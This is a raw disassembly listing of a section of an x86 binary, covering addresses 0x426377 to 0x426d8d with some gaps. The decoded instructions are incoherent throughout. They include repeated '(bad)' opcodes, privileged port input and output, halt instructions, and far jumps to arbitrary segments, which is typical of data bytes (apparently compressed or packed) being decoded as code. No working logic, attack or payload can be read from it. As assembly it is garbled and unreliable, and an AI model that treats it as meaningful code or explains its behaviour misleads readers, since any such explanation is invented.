  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x20844231
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    dl,bl
  42638d:	xchg   BYTE PTR fs:[edi+0x79],dh
  426391:	add    al,0x88
  426393:	aad    0x4f
  426395:	inc    edx
  426396:	push   edi
  426397:	lods   al,BYTE PTR ds:[esi]
  426398:	pop    esi
  426399:	and    al,0x9d
  42639b:	xchg   ebp,eax
  42639c:	inc    esi
  42639d:	sub    eax,0x7ff9d216
  4263a2:	frstor [ecx]
  4263a4:	ins    DWORD PTR es:[edi],dx
  4263a5:	fild   QWORD PTR [edi]
  4263a7:	or     eax,DWORD PTR [esi]
  4263a9:	pop    edi
  4263aa:	ja     0x426375
  4263ac:	fsub   DWORD PTR [ebp+0x35050513]
  4263b2:	push   ebx
  4263b3:	and    ebp,DWORD PTR [ebx]
  4263b5:	pushf  
  4263b6:	dec    ebx
  4263b7:	push   esi
  4263b8:	adc    al,0x32
  4263ba:	cli    
  4263bb:	cs cs cwde 
  4263be:	pop    esi
  4263bf:	je     0x426385
  4263c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263c2:	shl    ah,1
  4263c4:	add    edi,DWORD PTR [ebp+0x68]
  4263c7:	and    ebp,DWORD PTR [edx]
  4263c9:	mov    ebx,DWORD PTR [edi]
  4263cb:	mov    al,0xfb
  4263cd:	mov    eax,0xb642585
  4263d2:	adc    cl,BYTE PTR [ecx]
  4263d4:	xchg   esp,eax
  4263d5:	(bad)  
  4263d6:	mov    dh,0x29
  4263d8:	hlt    
  4263d9:	dec    eax
  4263da:	aaa    
  4263db:	sub    esp,0xffffff8f
  4263de:	out    0x2d,al
  4263e0:	in     eax,dx
  4263e1:	adc    BYTE PTR [edx-0x41],dl
  4263e4:	aad    0x74
  4263e6:	sub    DWORD PTR [ecx-0x16302b3c],esp
  4263ec:	cmp    BYTE PTR [esi-0x29],dh
  4263ef:	test   DWORD PTR [ecx-0x6600c559],0x275910d4
  4263f9:	rcl    DWORD PTR [edi],cl
  4263fb:	dec    ebx
  4263fc:	outs   dx,DWORD PTR ds:[esi]
  4263fd:	push   edi
  4263fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263ff:	loope  0x42641a
  426401:	pop    edx
  426402:	(bad)  
  426403:	cmp    esi,DWORD PTR [ebx+eax*4+0x67c3ae51]
  42640a:	sbb    dl,BYTE PTR [ecx+0x4bca235b]
  426410:	std    
  426411:	adc    edx,DWORD PTR [ebx+0x5c0a07fe]
  426417:	inc    edi
  426418:	out    0x78,al
  42641a:	jmp    0x426422
  42641c:	les    esp,FWORD PTR [ebx-0x4d]
  42641f:	outs   dx,DWORD PTR ds:[esi]
  426420:	mov    ds:0xeb9f762c,al
  426425:	retf   
  426426:	fistp  WORD PTR ds:0xf37acdf8
  42642c:	jecxz  0x42647a
  42642e:	sub    esp,DWORD PTR [ecx-0x74f2ebfc]
  426434:	mov    esi,0x3f272acb
  426439:	int3   
  42643a:	ins    BYTE PTR es:[edi],dx
  42643b:	xor    ecx,esi
  42643d:	inc    esi
  42643e:	dec    ecx
  42643f:	in     al,0xb7
  426441:	ins    DWORD PTR es:[edi],dx
  426442:	data16 clc 
  426444:	cwde   
  426445:	retf   0x3f92
  426448:	adc    BYTE PTR [ebx-0x1465e9d8],bh
  42644e:	and    al,0xa7
  426450:	arpl   WORD PTR [ebp+0x58],di
  426453:	repnz xchg ecx,eax
  426455:	dec    edx
  426456:	fdivr  QWORD PTR [eax+ecx*2+0x53]
  42645a:	lahf   
  42645b:	retf   0xb87b
  42645e:	inc    eax
  42645f:	aad    0xca
  426461:	or     al,0xe0
  426463:	jo     0x4264bc
  426465:	mov    ds:0x54446b18,eax
  42646a:	pop    ebx
  42646b:	xchg   ecx,eax
  42646c:	or     bl,BYTE PTR [eax-0x11eb1a66]
  426472:	push   0x8030535f
  426477:	pop    es
  426478:	xchg   edi,eax
  426479:	xchg   BYTE PTR [ebx+0x283c3503],bl
  42647f:	sbb    eax,0x2308c753
  426484:	mov    BYTE PTR [ebx+ebx*2-0x6c56a7b1],bl
  42648b:	sbb    BYTE PTR [esi],0x5
  42648e:	enter  0x34,0x0
	...
  4264f2:	add    BYTE PTR [eax],al
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x424e97b]
  426503:	mov    al,0xec
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	inc    ebp
  42650d:	xor    al,0x21
  42650f:	dec    edx
  426510:	scas   eax,DWORD PTR es:[edi]
  426511:	shl    DWORD PTR [ebx+0x50ad2cd7],cl
  426517:	add    ch,BYTE PTR [ebp-0x2]
  42651a:	scas   eax,DWORD PTR es:[edi]
  42651b:	aas    
  42651c:	xchg   ebp,eax
  42651d:	sti    
  42651e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42651f:	arpl   WORD PTR [edx+0x29fa2cb7],ax
  426525:	fsubr  QWORD PTR [eax-0x299778f2]
  42652b:	int3   
  42652c:	and    eax,0xe521eae3
  426531:	addr16 into 
  426533:	sar    DWORD PTR ds:[eax-0x219c506b],1
  42653a:	jb     0x42651a
  42653c:	push   ds
  42653d:	inc    esp
  42653e:	arpl   WORD PTR [eax],di
  426540:	pop    esi
  426541:	fcom   DWORD PTR [edi+eax*1-0x50]
  426545:	test   BYTE PTR [edx+eax*8-0x130a99f7],bl
  42654c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42654d:	pop    edi
  42654e:	ds jmp 0x426554
  426551:	jecxz  0x42651b
  426553:	rcl    DWORD PTR [esi+0x10],1
  426556:	popa   
  426557:	inc    ebx
  426558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426559:	push   esp
  42655a:	xchg   DWORD PTR [ecx+edx*4+0x19],ecx
  42655e:	mov    eax,ds:0x75df8541
  426563:	add    al,0x2a
  426565:	inc    esp
  426566:	pop    ss
  426567:	aad    0x3b
  426569:	rcl    DWORD PTR [edi+0x51],cl
  42656c:	jne    0x4265dd
  42656e:	aam    0xc3
  426570:	ror    DWORD PTR [edx],1
  426572:	xchg   esp,eax
  426573:	mov    esp,0xcdcdc70e
  426578:	cmp    DWORD PTR [edx],esi
  42657a:	sub    al,0xfe
  42657c:	jle    0x42650e
  42657e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42657f:	sbb    ch,bl
  426581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426582:	les    edi,FWORD PTR ds:0x9a500073
  426588:	das    
  426589:	mov    edi,DWORD PTR [ebx+0xc]
  42658c:	inc    ebp
  42658d:	bound  ebp,QWORD PTR [edx]
  42658f:	cli    
  426590:	jo     0x426566
  426592:	inc    ecx
  426593:	adc    BYTE PTR [edi-0x7ce1037],ah
  426599:	lock dec esi
  42659b:	mov    ebx,0xe6a26d17
  4265a0:	(bad)  
  4265a1:	cmp    esp,DWORD PTR [ebp-0x5b7932dd]
  4265a7:	cmp    al,cl
  4265a9:	push   cs
  4265aa:	cli    
  4265ab:	out    dx,al
  4265ac:	and    al,0x3d
  4265ae:	mov    ebx,0x8d585a2b
  4265b3:	cmp    BYTE PTR fs:[ecx+ebx*4],al
  4265b7:	daa    
  4265b8:	mov    eax,ds:0x366c2a2d
  4265bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265be:	push   0x2b
  4265c0:	sti    
  4265c1:	inc    ebx
  4265c2:	push   edx
  4265c3:	jo     0x4265fa
  4265c5:	(bad)  
  4265c6:	cdq    
  4265c7:	int    0x78
  4265c9:	mov    ?,edi
  4265cb:	pop    esp
  4265cc:	leave  
  4265cd:	scas   eax,DWORD PTR es:[edi]
  4265ce:	and    eax,DWORD PTR [edi+0x4dc112f7]
  4265d4:	in     eax,dx
  4265d5:	shr    BYTE PTR [edx+0x4073a797],cl
  4265db:	repnz daa 
  4265dd:	cwde   
  4265de:	xor    DWORD PTR es:0x1c65f400,esp
  4265e5:	inc    edi
  4265e6:	mov    bl,0x33
  4265e8:	mov    edx,0x9d8e212a
  4265ed:	test   al,0x35
  4265ef:	sbb    bh,BYTE PTR [edi-0x140889c1]
  4265f5:	lea    edi,[eax+0x11]
  4265f8:	xchg   edx,eax
  4265f9:	sahf   
  4265fa:	mov    edi,0xf645e6ec
  4265ff:	dec    ebp
  426600:	mov    ebx,0xefaa0a65
  426605:	sahf   
  426606:	stos   BYTE PTR es:[edi],al
  426607:	test   BYTE PTR cs:[eax+0x9113e06],dl
  42660e:	std    
  42660f:	repnz add BYTE PTR [eax],al
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x2cbc6da4]
  426682:	dec    ebp
  426683:	or     eax,0x199f0
  426688:	add    al,0x1
  42668a:	add    BYTE PTR [eax],al
  42668c:	mov    dl,0x54
  42668e:	fdiv   st,st(0)
  426690:	mov    eax,ds:0x40ad093a
  426695:	dec    edi
  426696:	popf   
  426697:	leave  
  426698:	mov    esi,0x613a03f8
  42669d:	jb     0x4266b6
  42669f:	sbb    dh,BYTE PTR [eax-0x6fbaa9fa]
  4266a5:	stos   DWORD PTR es:[edi],eax
  4266a6:	js     0x4266c3
  4266a8:	aam    0xf0
  4266aa:	sub    DWORD PTR [eax-0x57],ebx
  4266ad:	fucomp st(1)
  4266af:	cli    
  4266b0:	add    eax,0x94f4bc23
  4266b5:	lahf   
  4266b6:	pop    es
  4266b7:	mov    al,0x2c
  4266b9:	inc    esi
  4266ba:	jp     0x426665
  4266bc:	call   0x44f4:0x8bdc5e12
  4266c3:	std    
  4266c4:	mov    eax,0x77813a51
  4266c9:	cmp    BYTE PTR [edx-0x794b8386],cl
  4266cf:	es dec ebp
  4266d1:	loope  0x426727
  4266d3:	xor    DWORD PTR [edi+0x4eaf8950],0xc72650e9
  4266dd:	inc    ebx
  4266de:	or     eax,0xc82f3f08
  4266e3:	cdq    
  4266e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266e5:	mov    ds:0xa57301eb,eax
  4266ea:	sti    
  4266eb:	jecxz  0x42671d
  4266ed:	std    
  4266ee:	fld    QWORD PTR [edx+ebx*1]
  4266f1:	out    dx,eax
  4266f2:	cmc    
  4266f3:	mov    ebx,0x343c9330
  4266f8:	out    dx,eax
  4266f9:	add    edi,DWORD PTR ds:0x4ba4d121
  4266ff:	sti    
  426700:	lock std 
  426702:	push   ebp
  426703:	in     eax,dx
  426704:	push   edx
  426705:	inc    ecx
  426706:	pop    es
  426707:	fcom   DWORD PTR [eax-0x5e]
  42670a:	scas   al,BYTE PTR es:[edi]
  42670b:	nop
  42670c:	cmp    al,0x42
  42670e:	dec    esi
  42670f:	stc    
  426710:	cwde   
  426711:	pop    ds
  426712:	jne    0x426718
  426714:	cs pop esp
  426716:	les    edi,FWORD PTR [ecx+edx*1]
  426719:	jle    0x42672b
  42671b:	adc    bl,cl
  42671d:	stos   BYTE PTR es:[edi],al
  42671e:	hlt    
  42671f:	mov    bl,0x6b
  426721:	rcl    DWORD PTR [ebp+0x5c],1
  426724:	loopne 0x42672f
  426726:	lock lods al,BYTE PTR ds:[esi]
  426728:	jnp    0x42670e
  42672a:	pop    ss
  42672b:	(bad)  
  42672c:	sbb    DWORD PTR ds:0x64e92c1a,ecx
  426732:	outs   dx,DWORD PTR es:[esi]
  426734:	add    BYTE PTR [esp+eax*1+0x36],dh
  426738:	pop    esp
  426739:	inc    esi
  42673a:	jno    0x4267ad
  42673c:	xor    ah,BYTE PTR [ebx]
  42673e:	pop    ebp
  42673f:	sub    ecx,DWORD PTR [edx]
  426741:	sbb    eax,0x75272353
  426746:	ins    DWORD PTR es:[edi],dx
  426747:	scas   al,BYTE PTR es:[edi]
  426748:	inc    ebp
  426749:	mov    edx,0x145039d3
  42674e:	cmp    ecx,DWORD PTR [ecx]
  426750:	pushf  
  426751:	fsubrp st(5),st
  426753:	iret   
  426754:	jns    0x42671d
  426756:	sbb    esp,0xb960ed28
  42675c:	cmc    
  42675d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42675e:	ret    
  42675f:	imul   BYTE PTR [ebp-0x21]
  426762:	pop    edi
  426763:	fs jmp 0xe6d:0x12d02472
  42676b:	dec    esi
  42676c:	lds    esi,FWORD PTR [esp+edx*4]
  42676f:	mov    ch,0xe3
  426771:	pop    ecx
  426772:	push   ds
  426773:	popf   
  426774:	cmp    ebx,DWORD PTR [eax]
  426776:	pop    edi
  426777:	and    al,0xdf
  426779:	fsubr  st,st(4)
  42677b:	mov    ds:0x7a5b4ee6,eax
  426780:	xor    bl,bh
  426782:	cli    
  426783:	jl     0x42674f
  426785:	xor    dl,dl
  426787:	xor    ecx,ebx
  426789:	dec    DWORD PTR [eax]
  42678b:	loop   0x426753
  42678d:	mov    bh,BYTE PTR [eax-0x25]
	...
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426802:	fldcw  WORD PTR [esp+esi*8]
  426805:	call   0x0:0x1040001
  42680c:	cmp    al,0x92
  42680e:	and    edx,DWORD PTR [ebx]
  426810:	mov    BYTE PTR [edx],0x82
  426813:	jbe    0x42687f
  426815:	(bad)  
  426816:	nop
  426817:	cld    
  426818:	in     eax,dx
  426819:	gs mov ebx,0x4ec09bfd
  42681f:	popa   
  426820:	pop    ds
  426821:	mov    ah,BYTE PTR [eax+0x45]
  426824:	mov    BYTE PTR [edi-0x1a855403],ah
  42682a:	lock rcr bl,cl
  42682d:	out    dx,eax
  42682e:	jmp    0x78dd:0xe46ded3d
  426835:	jmp    0x92d89123
  42683a:	ins    DWORD PTR es:[edi],dx
  42683b:	mov    eax,ds:0x32da23dc
  426840:	popa   
  426841:	gs ja  0x4267f1
  426844:	push   0x6e
  426846:	jns    0x426827
  426848:	in     al,0xe1
  42684a:	mov    ds:0x777010de,eax
  42684f:	popf   
  426850:	push   ebx
  426851:	stc    
  426852:	popa   
  426853:	and    cl,cl
  426855:	fbstp  TBYTE PTR [ecx]
  426857:	cmovbe edx,ebx
  42685a:	cli    
  42685b:	adc    BYTE PTR [ebx],bh
  42685d:	ficom  DWORD PTR [esp+esi*1-0x68]
  426861:	dec    esp
  426862:	enter  0x1d8e,0x9e
  426866:	aam    0x4a
  426868:	inc    ebp
  426869:	and    DWORD PTR [esi-0x3],esi
  42686c:	call   0x2044:0xcef427a7
  426873:	or     cl,cl
  426875:	dec    edx
  426876:	out    dx,al
  426877:	dec    edx
  426878:	repnz leave 
  42687a:	jmp    0x825d680c
  42687f:	and    BYTE PTR [ebx+0x79e7bf3f],0x2f
  426886:	lods   eax,DWORD PTR ds:[esi]
  426887:	mov    ah,0xc
  426889:	xor    eax,0x56b27fbc
  42688e:	mov    bl,0x57
  426890:	es xchg ecx,eax
  426892:	loope  0x426816
  426894:	sti    
  426895:	push   ebx
  426896:	mov    bl,0xbd
  426898:	stos   BYTE PTR es:[edi],al
  426899:	in     al,dx
  42689a:	daa    
  42689b:	enter  0xac6a,0x73
  42689f:	push   ecx
  4268a0:	add    eax,0x41b1989e
  4268a5:	xchg   ebp,eax
  4268a6:	lock mov ds:0x7c0061e4,al
  4268ac:	or     ebp,ebx
  4268ae:	std    
  4268af:	scas   eax,DWORD PTR es:[edi]
  4268b0:	jg     0x426848
  4268b2:	cmp    BYTE PTR [ecx+0x5d1369ca],al
  4268b8:	retf   0xda33
  4268bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268bc:	mov    dl,0x1e
  4268be:	call   DWORD PTR [edi-0x23]
  4268c1:	mov    ah,0x1c
  4268c3:	mov    dh,0x61
  4268c5:	xchg   esi,eax
  4268c6:	add    ch,BYTE PTR ds:0x4547079
  4268cc:	and    al,bh
  4268ce:	das    
  4268cf:	adc    al,BYTE PTR [edx+0x4fb944a4]
  4268d5:	mov    eax,DWORD PTR [ebx-0x3e10d896]
  4268db:	xor    ecx,eax
  4268dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268de:	fadd   DWORD PTR [ecx+0x377e3363]
  4268e4:	jns    0x4268dc
  4268e6:	call   0x5ef9d8cf
  4268eb:	pop    edx
  4268ec:	or     ebx,ebx
  4268ee:	xchg   edi,eax
  4268ef:	or     eax,0x9e48bc34
  4268f4:	sti    
  4268f5:	push   ebx
  4268f6:	add    eax,0xdafee2c5
  4268fb:	in     eax,dx
  4268fc:	retf   0xeed8
  4268ff:	push   ss
  426900:	lahf   
  426901:	xor    bh,al
  426903:	push   esp
  426904:	or     esp,DWORD PTR [ebp-0x3ca5f94e]
  42690a:	mov    ecx,0x9e806e23
  42690f:	mov    esi,0x0
	...
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    edx,eax
  426981:	and    esp,DWORD PTR [eax+0x19bf874]
  426987:	add    BYTE PTR [ecx+eax*1],al
  42698a:	add    BYTE PTR [eax],al
  42698c:	fsub   QWORD PTR ds:0x6d2b6027
  426992:	sub    ecx,eax
  426994:	test   al,0x50
  426996:	push   eax
  426997:	and    BYTE PTR [edi+0x1b0c1c8f],cl
  42699d:	gs pop es
  42699f:	ficom  DWORD PTR [edi+0x6d]
  4269a2:	call   0xf9fd07eb
  4269a7:	push   ecx
  4269a8:	das    
  4269a9:	xchg   edi,eax
  4269aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269ab:	push   edi
  4269ac:	or     dl,BYTE PTR [ecx+0x40]
  4269af:	lds    esi,FWORD PTR [eax+0x48]
  4269b2:	arpl   WORD PTR [edx-0x7e8615ff],bp
  4269b8:	xchg   esp,eax
  4269b9:	mov    DWORD PTR [edx-0x73],eax
  4269bc:	lock std 
  4269be:	pop    esp
  4269bf:	call   0x68e773b5
  4269c4:	fisttp QWORD PTR [eax-0x46]
  4269c7:	and    BYTE PTR [eax],al
  4269c9:	rcr    BYTE PTR [esi+ebp*2+0x7a],1
  4269cd:	psllw  mm7,QWORD PTR [ebx-0x480282a5]
  4269d4:	push   esi
  4269d5:	jp     0x426a27
  4269d7:	ss xchg esi,eax
  4269d9:	leave  
  4269da:	ss jns 0x4269e6
  4269dd:	sbb    DWORD PTR [esi+0x6d80aeff],ecx
  4269e3:	popf   
  4269e4:	sub    eax,DWORD PTR [edi-0x20]
  4269e7:	leave  
  4269e8:	push   esi
  4269e9:	bound  ebp,QWORD PTR [eax-0x54]
  4269ec:	mov    bl,0x6b
  4269ee:	and    dh,BYTE PTR [ebx]
  4269f0:	inc    esi
  4269f1:	sub    al,BYTE PTR [ebx-0x4a]
  4269f4:	dec    ebx
  4269f5:	dec    esi
  4269f6:	push   DWORD PTR [esi]
  4269f8:	adc    DWORD PTR [edi-0x57a060d2],esi
  4269fe:	adc    cl,BYTE PTR [esi-0x27f2321]
  426a04:	leave  
  426a05:	or     DWORD PTR [esi+esi*8],esi
  426a08:	xor    DWORD PTR [eax+0x4e],edx
  426a0b:	or     BYTE PTR [esi+0x1bac4fa9],ah
  426a11:	inc    ebx
  426a12:	test   BYTE PTR [ecx],dh
  426a14:	pop    esp
  426a15:	inc    esp
  426a16:	pop    ss
  426a17:	(bad)  
  426a18:	pop    ss
  426a19:	jmp    0x6db937df
  426a1e:	aaa    
  426a1f:	cwde   
  426a20:	inc    esp
  426a21:	inc    esi
  426a22:	es adc edi,esi
  426a25:	mov    bl,0x63
  426a27:	call   0xa3ea25e8
  426a2c:	out    dx,eax
  426a2d:	sbb    al,0xf6
  426a2f:	jmp    0x426a79
  426a31:	and    ebp,eax
  426a33:	mov    BYTE PTR [edi-0x72],dh
  426a36:	xor    ch,cl
  426a38:	std    
  426a39:	in     eax,dx
  426a3a:	test   DWORD PTR [ebp-0x4acb7798],edi
  426a40:	jecxz  0x426a8c
  426a42:	and    eax,0xcc881321
  426a47:	insertq xmm6,(bad)
  426a49:	jns    0x426abb
  426a4b:	stc    
  426a4c:	adc    ebx,DWORD PTR [eax]
  426a4e:	les    ebp,FWORD PTR [eax-0x387a5f0d]
  426a54:	push   ecx
  426a55:	into   
  426a56:	test   DWORD PTR [ebp+edx*8+0x2c94c967],eax
  426a5d:	ins    DWORD PTR es:[edi],dx
  426a5e:	inc    esp
  426a5f:	cmp    ah,cl
  426a61:	inc    edx
  426a62:	ins    BYTE PTR es:[edi],dx
  426a63:	popf   
  426a64:	inc    edi
  426a65:	das    
  426a66:	mov    eax,0xde31445e
  426a6b:	push   ecx
  426a6c:	aaa    
  426a6d:	cld    
  426a6e:	sub    DWORD PTR [eax-0x3f],0xffffffc2
  426a72:	mov    ds:0x898fae70,eax
  426a77:	inc    ebp
  426a78:	test   DWORD PTR [edi-0x53356859],ecx
  426a7e:	inc    ebp
  426a7f:	push   ss
  426a80:	add    eax,0xaefdf197
  426a85:	mov    al,ds:0xcb8f3523
  426a8a:	js     0x426acb
  426a8c:	aaa    
  426a8d:	sbb    al,0x8
  426a8f:	mov    ch,0x0
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xbd
  426b01:	ds std 
  426b03:	call   0x104:0x19cfc
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	rcl    DWORD PTR [esi-0x6211c189],0x5b
  426b13:	or     ecx,edx
  426b15:	cmp    dl,BYTE PTR [ebx]
  426b17:	enter  0x1646,0xc3
  426b1b:	(bad)  
  426b1c:	jl     0x426b23
  426b1e:	jl     0x426b48
  426b20:	mov    ah,0xad
  426b22:	dec    ebp
  426b23:	retf   0xc176
  426b26:	call   0x787b:0x91e3c5e4
  426b2d:	sub    ah,ch
  426b2f:	fdivr  QWORD PTR [ebp-0x69]
  426b32:	dec    eax
  426b33:	and    dl,BYTE PTR [edi-0x764f26a6]
  426b39:	cs (bad) 
  426b3b:	jae    0x426bb5
  426b3d:	or     ch,cl
  426b3f:	and    esp,ebp
  426b41:	cs repz jmp 0xdf3b:0x33880155
  426b4a:	js     0x426b64
  426b4c:	cdq    
  426b4d:	add    ecx,DWORD PTR [si]
  426b50:	sti    
  426b51:	scas   al,BYTE PTR es:[edi]
  426b52:	adc    ebx,ecx
  426b54:	pusha  
  426b55:	out    dx,eax
  426b56:	and    ebp,esi
  426b58:	shl    ch,cl
  426b5a:	push   edi
  426b5b:	fist   WORD PTR [ecx+0x19]
  426b5e:	out    dx,al
  426b5f:	xchg   esp,eax
  426b60:	mov    ebp,0xecd21b75
  426b65:	sub    eax,0x20606f17
  426b6a:	push   es
  426b6b:	fisubr WORD PTR [esi-0x42600b86]
  426b71:	cmp    al,0xd2
  426b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b74:	and    DWORD PTR [esi-0x1f],0x3f5d5d40
  426b7b:	(bad)  
  426b7c:	jae    0x426bd9
  426b7e:	mov    ah,BYTE PTR [edx]
  426b80:	retf   0xbf90
  426b83:	push   ss
  426b84:	out    dx,al
  426b85:	xor    esi,edi
  426b87:	mov    cs,WORD PTR [ecx+0x54]
  426b8a:	mov    bh,0x81
  426b8c:	and    eax,0xa3dc9c47
  426b91:	adc    ch,BYTE PTR [ebp+0x74]
  426b94:	ror    DWORD PTR [ebp-0x662ea349],1
  426b9a:	pushf  
  426b9b:	ror    DWORD PTR [edx+0x4ec97fe6],1
  426ba1:	mov    al,ds:0x45effbf7
  426ba6:	jo     0x426bfa
  426ba8:	enter  0x466d,0x5d
  426bac:	sbb    ebx,DWORD PTR [edx-0x2eea0321]
  426bb2:	sbb    ebx,eax
  426bb4:	or     al,0x1b
  426bb6:	hlt    
  426bb7:	mov    al,ds:0x9d854cb6
  426bbc:	fwait
  426bbd:	push   esi
  426bbe:	add    BYTE PTR [ebp-0x77],0xc1
  426bc2:	sbb    eax,0x6dd03d36
  426bc7:	retf   
  426bc8:	pop    eax
  426bc9:	rcl    BYTE PTR [esi],0x89
  426bcc:	imul   ecx,DWORD PTR [edx+0x7e56ef67],0xa26ea744
  426bd6:	and    al,0x9
  426bd8:	ret    0x574c
  426bdb:	cmp    eax,0xa6ae3d34
  426be0:	loop   0x426c3a
  426be2:	jno    0x426c5d
  426be4:	sub    WORD PTR [ebx+ebx*8-0x43649e48],ax
  426bec:	popa   
  426bed:	xchg   DWORD PTR [ecx+0x64],eax
  426bf0:	std    
  426bf1:	aas    
  426bf2:	call   0x645704fe
  426bf7:	and    al,0xdf
  426bf9:	mov    edi,DWORD PTR [edx-0x69]
  426bfc:	xor    BYTE PTR [edx],al
  426bfe:	sub    DWORD PTR [edx+esi*2],ecx
  426c01:	fsub   DWORD PTR [eax-0x53]
  426c04:	push   esp
  426c05:	mov    esi,0xfdebbe32
  426c0a:	jnp    0x426c4d
  426c0c:	sbb    edx,0xc3b
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xbef4dd38
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	jl     0x426c20
  426c8e:	fnstcw WORD PTR [eax-0x7b]
  426c91:	enter  0x308e,0x79
  426c95:	mov    esp,0x2bb5d0e6
  426c9a:	push   edi
  426c9b:	pop    edi
  426c9c:	neg    BYTE PTR [eax]
  426c9e:	ss push es
  426ca0:	test   esp,eax
  426ca2:	xor    edx,0x9ea71ca
  426ca8:	jg     0x426cdf
  426caa:	rcl    BYTE PTR [edx*4-0x6f59a069],cl
  426cb1:	pop    ebp
  426cb2:	inc    edi
  426cb3:	(bad)  
  426cb4:	xor    bl,BYTE PTR [ebx+eax*2+0x71]
  426cb8:	dec    edx
  426cb9:	arpl   WORD PTR [esp+ebp*1],ax
  426cbc:	push   cs
  426cbd:	fcomp  DWORD PTR [edx+ecx*1]
  426cc0:	pop    ds
  426cc1:	cld    
  426cc2:	mov    eax,ds:0xd689819b
  426cc7:	mov    ebp,0xd1fac9c9
  426ccc:	les    ebx,FWORD PTR [eax-0xd7b44b7]
  426cd2:	mov    ch,BYTE PTR [eax+0x394a4473]
  426cd8:	push   esi
  426cd9:	shr    edx,cl
  426cdb:	mov    BYTE PTR [ecx-0x2206c680],cl
  426ce1:	lea    esi,[ecx-0x55e27a98]
  426ce7:	cmp    al,0x88
  426ce9:	outs   dx,DWORD PTR ds:[esi]
  426cea:	dec    ecx
  426ceb:	and    DWORD PTR [ecx+ebp*1+0x71fc5776],ebp
  426cf2:	rcl    DWORD PTR [eax-0x9],0x61
  426cf6:	and    esp,DWORD PTR [edx]
  426cf8:	xchg   BYTE PTR [ecx+0x7c],dh
  426cfb:	pop    edx
  426cfc:	das    
  426cfd:	bound  ebp,QWORD PTR [edi-0x25]
  426d00:	out    0xc,al
  426d02:	pushf  
  426d03:	imul   DWORD PTR [ecx]
  426d05:	push   ecx
  426d06:	inc    DWORD PTR [ecx]
  426d08:	shr    DWORD PTR [ebx-0xc],0xca
  426d0c:	push   ss
  426d0d:	adc    dh,BYTE PTR [eax-0x41]
  426d10:	gs and al,0xa
  426d13:	les    edi,FWORD PTR [edi+0x5e]
  426d16:	jno    0x426d7b
  426d18:	inc    esi
  426d19:	xchg   esi,eax
  426d1a:	xor    eax,ebx
  426d1c:	mul    ecx
  426d1e:	fcomp  QWORD PTR [esi-0x162629c0]
  426d24:	sub    al,0xba
  426d26:	in     eax,0x11
  426d28:	out    dx,eax
  426d29:	cmp    edx,DWORD PTR [eax-0x7e]
  426d2c:	mov    ch,0xe3
  426d2e:	adc    eax,0xd712d2fb
  426d33:	or     BYTE PTR ss:[edi+0x4a],dl
  426d37:	(bad)  
  426d38:	mov    al,ds:0xd7a6729e
  426d3d:	loope  0x426cd0
  426d3f:	out    0xf1,eax
  426d41:	pop    ss
  426d42:	dec    ebx
  426d43:	or     eax,0x7139c2c1
  426d48:	jg     0x426d46
  426d4a:	daa    
  426d4b:	dec    ebp
  426d4c:	hlt    
  426d4d:	fwait
  426d4e:	retf   0x2143
  426d51:	adc    bh,ch
  426d53:	lea    ebp,[ebx-0x17152c59]
  426d59:	push   edx
  426d5a:	fsubp  st(7),st
  426d5c:	or     eax,DWORD PTR ds:0xef64ee90
  426d62:	cmp    BYTE PTR ds:0xdbabaacf,dl
  426d68:	sbb    BYTE PTR [ebp+0x41],ah
  426d6b:	sti    
  426d6c:	mov    edi,DWORD PTR [esi+ecx*2+0x3a8b8473]
  426d73:	(bad)  
  426d74:	cmp    DWORD PTR [edx-0x25],esi
  426d77:	mov    ebp,0xe08ad7c0
  426d7c:	sbb    bh,BYTE PTR [ebp+esi*4+0x309e4f03]
  426d83:	ret    
  426d84:	imul   ecx,DWORD PTR [edx+0x34],0xffffff92
  426d88:	sbb    eax,0x3fd0503d
  426d8d:	pop    ebx
